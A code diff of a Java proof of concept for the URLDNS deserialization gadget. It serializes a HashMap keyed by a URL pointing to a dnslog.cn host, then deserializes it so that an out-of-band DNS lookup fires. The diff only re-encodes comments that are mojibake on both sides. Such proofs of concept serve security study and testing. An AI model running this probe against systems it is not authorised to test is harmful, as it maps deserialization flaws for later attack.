@@ -11,27 +11,27 @@ import java.util.HashMap;
 public class URLDNS {
 
     public static void main(String[] args) throws Exception {
-        HashMap<URL, String> hashMap = new HashMap<URL, String>();// ¶¨ÒåÒ»¸öhashMap£¬keyÎªURL,valueÎªString
-        URL url = new URL("http://nk3z5e.dnslog.cn");// ÉèÖÃÎÒÃÇ´¥·¢dns²éÑ¯µÄurl
+        HashMap<URL, String> hashMap = new HashMap<URL, String>();// å®šä¹‰ä¸€ä¸ªhashMapï¼Œkeyä¸ºURL,valueä¸ºString
+        URL url = new URL("http://nk3z5e.dnslog.cn");// è®¾ç½®æˆ‘ä»¬è§¦å‘dnsæŸ¥è¯¢çš„url
 
-        // ÏÂÃæÔÚputÇ°ĞŞ¸ÄurlµÄhashcodeÎª·Ç-1µÄÖµ£¬putºó½«hashcodeĞŞ¸ÄÎª-1
-        // 1. ½«urlµÄhashCode×Ö¶ÎÉèÖÃÎªÔÊĞíĞŞ¸Ä
+        // ä¸‹é¢åœ¨putå‰ä¿®æ”¹urlçš„hashcodeä¸ºé-1çš„å€¼ï¼Œputåå°†hashcodeä¿®æ”¹ä¸º-1
+        // 1. å°†urlçš„hashCodeå­—æ®µè®¾ç½®ä¸ºå…è®¸ä¿®æ”¹
         Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
         f.setAccessible(true);
-        // 2. ÉèÖÃurlµÄhashCode×Ö¶ÎÎªÈÎÒâ²»Îª-1µÄÖµ
+        // 2. è®¾ç½®urlçš„hashCodeå­—æ®µä¸ºä»»æ„ä¸ä¸º-1çš„å€¼
         f.set(url, 111);
-        System.out.println(url.hashCode()); // »ñÈ¡hashCodeµÄÖµ£¬ÑéÖ¤ÊÇ·ñĞŞ¸Ä³É¹¦
-        // 3. ½« url ·ÅÈë hashMap ÖĞ£¬ÓÒ±ß²ÎÊıËæ±ãĞ´
+        System.out.println(url.hashCode()); // è·å–hashCodeçš„å€¼ï¼ŒéªŒè¯æ˜¯å¦ä¿®æ”¹æˆåŠŸ
+        // 3. å°† url æ”¾å…¥ hashMap ä¸­ï¼Œå³è¾¹å‚æ•°éšä¾¿å†™
         hashMap.put(url, "" +
                 "");
-        // 4. ĞŞ¸ÄurlµÄhashCode×Ö¶ÎÎª-1£¬ÎªÁË´¥·¢DNS²éÑ¯£¨Ö®ºó»á½âÊÍ£©
+        // 4. ä¿®æ”¹urlçš„hashCodeå­—æ®µä¸º-1ï¼Œä¸ºäº†è§¦å‘DNSæŸ¥è¯¢ï¼ˆä¹‹åä¼šè§£é‡Šï¼‰
         f.set(url, -1);
 
-        //ĞòÁĞ»¯²Ù×÷
+        //åºåˆ—åŒ–æ“ä½œ
         ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
         oos.writeObject(hashMap);
 
-        //·´ĞòÁĞ»¯£¬´¥·¢payload
+        //ååºåˆ—åŒ–ï¼Œè§¦å‘payload
         ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
         ois.readObject();
     }
